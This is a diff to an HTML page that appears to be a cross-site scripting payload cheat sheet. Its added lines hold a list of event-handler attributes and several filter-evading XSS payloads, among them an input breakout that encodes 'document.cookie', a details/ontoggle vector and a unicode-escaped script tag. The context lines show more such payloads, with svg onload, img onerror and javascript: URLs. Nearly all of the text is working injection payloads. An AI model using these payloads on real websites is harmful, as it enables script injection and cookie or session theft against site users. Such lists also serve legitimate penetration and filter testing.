@@ -110,7 +110,30 @@ window.location.replace("http://site.com?x=3site.com/?x=3 "-alert`1`,")
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe&gt;&lt;p title="&lt;/iframe&gt;&lt;svg/onload=alert(45)&gt;"&gt;
 </code></pre></div></div>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>onclick
+ondblclick
+onmousedown
+onmousemove
+onmouseover
+onmouseout
+onmouseup
+onkeydown
+onkeypress
+onkeyup
+onabort
+onerror
+onload
+onresize
+onscroll
+onunload
+onsubmit
+onblur
+onchange
+onfocus
+onreset
+onselect
+onMoveOn
+</code></pre></div></div>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;--`&lt;img/src=` onerror=confirm`xss`&gt; --!&gt; 
 </code></pre></div></div>
@@ -149,7 +172,12 @@ data:image/x-icon;base64
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"javascript:"</span><span class="err">/*'/*`/*</span><span class="na">--</span><span class="nt">&gt;&lt;html</span> <span class="err">\"</span> <span class="na">onmouseover=</span><span class="s">/*&amp;lt;svg/*/onload=alert(/xss/)//</span><span class="nt">&gt;</span>
 <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"javascript://comment%0a%0dalert(/xss/);"</span><span class="nt">&gt;</span> Click Me<span class="nt">&lt;/a&gt;</span>
 </code></pre></div></div>
-
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;input type="text" name="param" value="XSS"%0D&lt;body='X' onmouseover=setInterval`alert\x28&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;\x29`//
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;details/open/ontoggle=window.alert`1`&gt;
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(123)&lt;/script&gt;
+</code></pre></div></div>
 
   </article>
 </div>
